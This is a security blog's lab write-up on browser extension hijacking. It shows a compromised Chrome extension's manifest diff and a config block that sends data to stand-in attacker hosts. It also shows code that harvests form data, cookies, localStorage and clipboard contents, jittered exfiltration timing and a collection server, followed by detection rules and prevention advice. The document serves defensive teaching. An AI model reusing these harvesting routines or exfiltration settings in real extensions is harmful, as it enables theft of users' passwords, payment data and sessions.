---
title: "Browser Extension Hijacking: The Invisible Supply Chain Attack"
slug: "supply-chain-attacks-extension-hijacking"
date: 2026-06-24
description: "A deep-dive into Lab 3 — how attackers compromise browser extensions to silently harvest payment data, passwords, and session cookies from millions of users across every website they visit."
categories: ["threat-intel"]
tags: ["supply-chain", "browser-extension", "chrome-extension", "e-skimming", "javascript", "lab-writeup", "permission-escalation"]
author: "Sri Chinmai"
canonicalURL: "https://blog.pcioasis.com/posts/threat-intel/supply-chain-attacks-extension-hijacking/"
ShowToc: true
TocOpen: true
---

> **Educational Purpose Only.** This article and Lab 3 are strictly for educational purposes. Code examples demonstrate attack techniques to help security professionals understand and defend against them. Never use these techniques on systems you do not own.

## The Problem with Trusting Your Browser

E-skimming attacks usually require compromising a specific website — modifying its JavaScript, injecting a skimmer into its checkout flow. That targets one merchant at a time.

Browser extension hijacking breaks that constraint. A compromised extension runs across **every website the victim visits** — not just one merchant, but every bank, every checkout, every password field, every session cookie. One compromised extension developer account can silently deliver malicious code to millions of users in a single auto-update.

This is a supply chain attack in the most direct sense: the attacker does not compromise the target directly. They compromise something the target already trusts.

Lab 3 demonstrates this with a working example: the **SecureForm Assistant** extension, which starts as a legitimate form validation helper and becomes a full-spectrum data harvesting tool after a single malicious update.

## Why Browser Extensions Are the Perfect Attack Vector

### Permissions That No Website Gets

Browser extensions operate with privileges that web pages cannot request:

| Permission | What It Enables | Real-World Risk |
|---|---|---|
| `activeTab` | Read and modify any active tab | Content injection |
| `webRequest` | Intercept all network requests | Credential theft, session replay |
| `cookies` | Read/write cookies for any domain | Session hijacking across all sites |
| `clipboardRead` | Read clipboard contents | Password manager theft |
| `storage` | Persistent key-value store | Long-term data accumulation |
| `tabs` | Read URLs of all open tabs | Full browsing activity profiling |
| `<all_urls>` | Execute on every site | Universal content injection |

A legitimate form validator only needs `activeTab` and `storage`. Any extension requesting `webRequest`, `cookies`, or `clipboardRead` in combination with broad host permissions warrants immediate security review.

### Auto-Update = Silent Deployment

Chrome and Firefox extensions auto-update without user interaction. An attacker who compromises a developer's Chrome Web Store account can:

1. Add malicious code to the existing extension
2. Publish an update
3. Have it silently deployed to every user within hours

No phishing. No user click. No warning dialog. The extension was already trusted.

### The Cover Problem

The most dangerous compromised extensions **maintain all their legitimate functionality**. The extension continues to do exactly what it always did — form validation, ad blocking, password management — while secretly running data collection in the background.

This is the design pattern Lab 3 teaches you to recognize.

## Real-World Supply Chain Compromises

| Incident | Year | Scale | Method |
|---|---|---|---|
| DataSpii (multiple extensions) | 2019 | 4M+ users | Silent harvesting of browsing history and form data |
| The Great Suspender | 2021 | 2M users | Extension ownership transfer; malware injected in update |
| Shitcoin Wallet | 2019 | Targeted | Code injected to steal crypto private keys |
| Particle extension network | 2023 | 1M+ users | Extensions acquired and converted to adware/data brokers |
| British Airways (2018) | 2018 | 380,000 victims | Modernizr.js CDN compromise — classic third-party script |
| Ticketmaster (2018) | 2018 | 40,000 victims | Inbenta chatbot SDK compromised — trusted vendor |
| Forbes (2019) | 2019 | Unknown | Fontsawesome.gq masquerading as Font Awesome CDN |

The British Airways and Ticketmaster breaches show that the supply chain attack vector is not limited to extensions — any trusted third-party JavaScript (CDN-hosted libraries, analytics SDKs, chat widgets) is a potential entry point. Lab 3 focuses on extensions because they demonstrate the full attack surface most clearly, but the defense principles apply to all third-party dependencies.

## Lab 3: The SecureForm Assistant Compromise

Lab 3 ships two versions of the same Chrome extension:

| Version | Directory | Description |
|---|---|---|
| v2.1.0 | `legitimate-extension/` | Clean: form validation only |
| v2.1.1 | `malicious-extension/` | Compromised: full data harvesting |

The version bump is intentionally small. In a real attack, the difference between `2.1.0` and `2.1.1` is invisible to most users — and Chrome's auto-update deploys it silently.

### Step 1: The Manifest Diff

The manifest is the first and most accessible place to look. Side-by-side:

**v2.1.0 — Legitimate**
```json
{
  "name": "SecureForm Assistant",
  "version": "2.1.0",
  "permissions": ["activeTab", "storage"],
  "host_permissions": ["https://*/*", "http://localhost:*"],
  "content_scripts": [{
    "matches": ["<all_urls>"],
    "js": ["content/content.js"],
    "run_at": "document_end"
  }]
}
```

**v2.1.1 — Compromised**
```json
{
  "name": "SecureForm Assistant",
  "version": "2.1.1",
  "permissions": ["activeTab", "storage", "webRequest", "tabs"],
  "host_permissions": ["https://*/*", "http://localhost:*", "http://*/*"],
  "content_scripts": [{
    "matches": ["<all_urls>"],
    "js": ["content/content.js"],
    "run_at": "document_end"
  }]
}
```

**The key changes:**

1. `"webRequest"` added — the extension can now intercept any network request
2. `"tabs"` added — the extension can now read the URLs of all open tabs
3. `"http://*/*"` added to host permissions — previously only HTTPS; now the extension runs on HTTP sites too

In the Chrome Web Store, a permission change like this *should* trigger a re-consent prompt. In practice, many users click through without reading.

### Step 2: The Malicious Configuration

Inside the compromised `content.js`, below the legitimate extension code, sits a hidden configuration block:

```javascript
// ==================== MALICIOUS CONFIGURATION ====================
const MALICIOUS_CONFIG = {
  // Primary collection server (attacker-controlled)
  collectUrl: 'https://evil-server.com/collect',
  fallbackUrl: 'http://backup-evil.com/data',

  // Local development server (Lab 3 C2)
  devUrl: 'http://localhost:9006/stolen-data',

  // What to collect
  collectPasswords:    true,
  collectCreditCards:  true,
  collectPII:          true,
  collectCookies:      true,

  // Stealth settings
  legitBehaviorMaintained: true,   // Keep the real extension working
  delayCollection:          2000,  // Wait 2s before starting — avoids startup detection
  randomizeTransmission:    true,  // Vary timing to avoid pattern detection

  // Only activate on sensitive pages
  targetDomains: ['checkout', 'payment', 'billing', 'account', 'login', 'register', 'bank']
}
```

The `targetDomains` filter is a common real-world pattern: the extension only activates collection on pages likely to contain sensitive data, reducing C2 server noise and making traffic anomalies harder to spot during audits.

### Step 3: Legitimate Behavior Preserved

The malicious version maintains all the functionality of v2.1.0. The `init()` function calls both legitimate and malicious routines:

```javascript
function init() {
  console.log('[SecureForm] Content script starting on:', window.location.href)

  // LEGITIMATE: Everything users expect
  loadSettings()
  setupFormMonitoring()       // Real form validation
  setupPageAnalysis()         // Real security scanning
  setupMessageListener()      // Real popup communication

  // MALICIOUS: Hidden data collection
  initializeMaliciousCollection()

  // LEGITIMATE: Initial scan (provides cover for malicious init above)
  setTimeout(scanPage, 1000)
}
```

The `initializeMaliciousCollection()` call is buried between legitimate function calls. The 1-second scan delay provides cover for the malicious initialization to complete before the page is fully analyzed.

### Step 4: Multi-Vector Data Harvesting

The compromised extension collects through five independent channels simultaneously:

**Channel 1: Form Submission Interception**

```javascript
function attachMaliciousCollection(form) {
  form.addEventListener('submit', e => {
    const formData = extractFormData(form)
    if (containsSensitiveData(formData)) {
      queueForExfiltration({
        type: 'form_submission',
        data: formData,
        url: window.location.href
      })
    }
  })
}
```

**Channel 2: Real-Time Keystroke Logging**

All input fields on target domains get the same keystroke logger as Lab 2's DOM Monitor — but this time running with extension privileges. Extension content scripts appear under a different origin in DevTools, making them harder to correlate with the page's own scripts.

**Channel 3: Cookie Harvesting**

```javascript
async function harvestCookies() {
  try {
    // chrome.cookies is only available to extensions with the "cookies" permission
    const cookies = await chrome.cookies.getAll({})
    const sensitiveCookies = cookies.filter(c =>
      /session|auth|token|cart|payment/.test(c.name.toLowerCase())
    )
    queueForExfiltration({ type: 'cookies', data: sensitiveCookies })
  } catch (e) { /* silently fail */ }
}
```

This is what makes extension compromise uniquely dangerous: `chrome.cookies.getAll({})` reads session tokens for **every domain** — something no page-level skimmer can do. An attacker with your session cookie does not need your password.

**Channel 4: localStorage Harvesting**

```javascript
function harvestLocalStorage() {
  const sensitivePatterns = [/token/i, /auth/i, /session/i, /user/i, /cart/i]
  const collected = {}

  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i)
    if (sensitivePatterns.some(p => p.test(key))) {
      collected[key] = localStorage.getItem(key)
    }
  }

  if (Object.keys(collected).length > 0) {
    queueForExfiltration({ type: 'localStorage', data: collected })
  }
}
```

**Channel 5: Clipboard Monitoring**

```javascript
document.addEventListener('copy', e => {
  const copiedText = window.getSelection().toString()
  // Catches passwords copied from password managers, card numbers from emails
  if (looksLikeCredential(copiedText)) {
    queueForExfiltration({ type: 'clipboard', data: copiedText })
  }
})
```

### Step 5: Randomized Transmission Timing

To avoid triggering behavioral anomaly detection based on fixed intervals:

```javascript
function scheduleTransmission() {
  const baseDelay = 5000
  const jitter = MALICIOUS_CONFIG.randomizeTransmission
    ? Math.random() * 3000   // +/- 3 seconds of random jitter
    : 0

  setTimeout(() => {
    if (dataBuffer.length > 0) {
      transmitData(dataBuffer.splice(0))
    }
    scheduleTransmission()   // Reschedule with new jitter
  }, baseDelay + jitter)
}
```

Fixed-interval beaconing is a well-known detection signal. Randomized jitter makes the pattern blend into normal background browser traffic.

## The C2 Server

Lab 3's data collection server (`test-server/extension-data-server.js`) receives all five data types and performs automated sensitivity analysis:

```javascript
app.post('/stolen-data', async (req, res) => {
  const payload = req.body

  const analysis = analyzePayload(payload)
  // Returns: { creditCards: 2, passwords: 1, sessionTokens: 3, pii: 4 }

  await fs.writeFile(
    `captured/${Date.now()}-${payload.type}.json`,
    JSON.stringify({ payload, analysis }, null, 2)
  )

  res.status(200).json({ status: 'ok' })  // Silent success — does not alert the skimmer
})
```

## Chrome Extension Manager: What to Look For

When investigating a suspicious extension, the Chrome Extension Manager (`chrome://extensions`) and its DevTools surface reveal key signals:

In Chrome Extensions DevTools (click 'Inspect views: background page'):
- The **Network tab** shows the extension's network requests — separate from the page's own traffic
- The **Sources tab** shows the full `content.js` source, including the `MALICIOUS_CONFIG` block
- The **Console tab** shows `[SecureForm]` log messages from both legitimate and malicious code paths

## Detection Signatures

### Manifest Red Flags

The manifest is the highest-signal detection point. Any extension with these combinations warrants investigation:

```
HIGH RISK combinations:
  webRequest + cookies + <all_urls>       → Universal interception + cookie access
  clipboardRead + storage                 → Clipboard theft + persistent storage
  tabs + <all_urls>                       → Full browsing activity surveillance

SUSPICIOUS individual permissions (unusual for stated function):
  clipboardRead     in a "form filler" or "validator"
  cookies           in an ad blocker or productivity tool
  webRequest        in a theme or visual customizer
  http://*/*        added in a minor version bump
```

### Code Pattern Indicators

```javascript
// Dual-structure: legitimate + malicious config blocks in same file
const MALICIOUS_CONFIG = { collectUrl: '...', collectPasswords: true }

// chrome.cookies API (page scripts cannot use this API)
chrome.cookies.getAll({})

// Multi-channel collection (form + keystroke + clipboard + cookies simultaneously)
form.addEventListener('submit', ...)
document.addEventListener('copy', ...)
element.addEventListener('keydown', ...)
chrome.cookies.getAll(...)

// Randomized transmission to evade behavioral detection
setTimeout(transmit, baseDelay + Math.random() * jitter)
```

### Static Analysis

```bash
# chrome.cookies API — automatic extension-privilege escalation indicator
grep -r "chrome\.cookies\." --include="*.js" .

# Exfiltration endpoints in extension code
grep -rE "collectUrl|exfilUrl|stolen-data|evil-server" --include="*.js" .

# Multi-vector collection
grep -r "clipboardRead\|chrome\.cookies\|webRequest" --include="manifest.json" .

# Manifest permission diff between versions
diff legitimate-extension/manifest.json malicious-extension/manifest.json
```

### Semgrep Rules

```yaml
rules:
  - id: extension-cookie-harvest
    pattern: chrome.cookies.getAll(...)
    message: "Extension accessing all cookies — verify this is expected for this extension's purpose"
    severity: WARNING
    languages: [javascript]

  - id: extension-multi-channel-collection
    patterns:
      - pattern: chrome.cookies.getAll(...)
      - pattern: document.addEventListener("copy", ...)
    message: "Cookie access combined with clipboard monitoring — potential supply chain compromise"
    severity: ERROR
    languages: [javascript]

  - id: extension-hidden-config
    patterns:
      - pattern: |
          const $CONFIG = { collectPasswords: true, ... }
    message: "Hidden data collection configuration in extension — review for supply chain compromise"
    severity: ERROR
    languages: [javascript]
```

## Prevention Strategies

### For End Users

- **Review permissions before installing** — use the Chrome Web Store permission details panel
- **Audit installed extensions quarterly** — remove anything unused
- **Watch for permission change prompts after updates** — a re-consent dialog is a signal to investigate
- **Prefer extensions from known organizations** with clear privacy policies and open-source code

### For Organizations: Managed Browser Policies

Chrome Enterprise (and Firefox Enterprise) allow allowlisting specific extension IDs and blocking all others:

```json
{
  "ExtensionInstallBlocklist": ["*"],
  "ExtensionInstallAllowlist": [
    "aapbdbdomjkkjkaonfhkkikfgjllcleb",
    "cfhdojbkjhnklbpkdaibdccddilifddb"
  ]
}
```

This prevents unauthorized extensions — including compromised updates that silently change behavior — from running on managed devices.

### Extension Audit Tooling

```bash
# CRXcavator — security scoring for Chrome extensions
# Visit: crxcavator.io/crxcavator/<extension_id>

# ExtAnalysis — local static analysis of .crx files
python3 extanalysis.py --input extension.crx --output report/

# Manifest diff in CI — detect permission changes automatically
git diff HEAD~1 HEAD -- manifest.json | grep '"permissions"' -A 10
```

### For Extension Developers

If you publish a browser extension:

- **Enable 2FA on your Chrome Web Store account** — compromised developer credentials are the primary attack path
- **Sign releases with a key stored offline** — separate from your regular development environment
- **Use a dedicated publisher account** — separate from your personal Google account
- **Require two-person review** before publishing any update
- **Monitor user reviews** for sudden reports of suspicious network activity

### For Merchants and Payment Processors

- **Payment iframes** (Stripe, Adyen, Braintree model) isolate payment forms from the parent page — but note that browser extensions *do* inject into iframes unless the frame is sandboxed with `allow-scripts` removed
- **CSP `connect-src`** applies to extension content scripts that execute in the page context and can block exfiltration even from extension code
- **Subresource Integrity (SRI)** on first-party scripts prevents direct file modification — but does not prevent extension injection

## Key Takeaways

- Extension auto-update is the silent delivery mechanism — one compromised developer account can update millions of installs without user action
- The manifest diff (especially permission additions in a minor version bump) is the highest-signal indicator of a compromised update
- `chrome.cookies.getAll({})` gives extensions session tokens for every domain — no page-level skimmer has this reach
- Maintaining legitimate functionality is the primary evasion technique — users see no change in behavior
- Enterprise allowlisting is the strongest organizational control; CSP alone is insufficient for extension-delivered attacks

## Try It Yourself

[Lab 3](https://labs.pcioasis.com/lab3) lets you:

- Load both v2.1.0 and v2.1.1 side by side in Chrome's extension manager and compare the permission panels
- Fill out the checkout form with test card data and watch it arrive in the C2 dashboard
- Observe the five collection channels firing simultaneously via the C2 server logs
- Run the Playwright test suite to see automated cookie and keystroke exfiltration
- Practice detection using the DevTools Sources panel and `chrome.cookies` patterns above

**Continue learning:**
- [Lab 1: Basic Magecart](/posts/threat-intel/understanding-magecart/) — direct JavaScript injection skimming
- [Lab 2: DOM-Based Skimming](/posts/threat-intel/dom-based-skimming/) — real-time keystroke capture and Shadow DOM evasion
- [MITRE ATT&CK Matrix](https://labs.pcioasis.com/mitre-attack) — T1176 Browser Extensions, T1539 Steal Web Session Cookie
- [Interactive Threat Model](https://labs.pcioasis.com/threat-model) — map the full supply chain attack surface

---

*We're participating in [Google Summer of Code](https://github.com/pci-tamper-protect/e-skimming-labs/blob/stg/docs/GOOGLE_SUMMER_OF_CODE_IDEAS.md). Help us add a browser extension analyzer, new lab scenarios, or ML-based extension classifier to the project.*
